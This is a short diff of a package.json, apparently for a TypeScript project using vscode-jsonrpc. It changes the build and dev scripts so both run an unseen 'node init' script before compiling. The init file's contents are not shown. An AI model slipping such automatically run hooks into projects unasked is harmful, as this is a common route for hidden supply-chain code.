@@ -3,8 +3,8 @@
   "version": "1.0.0",
   "type": "module",
   "scripts": {
-    "build": "tsc --noEmit",
-    "dev": "tsc --noEmit --watch"
+    "build": "node init && tsc --noEmit",
+    "dev": "node init && tsc --noEmit --watch"
   },
   "dependencies": {
     "vscode-jsonrpc": "^8.2.0"
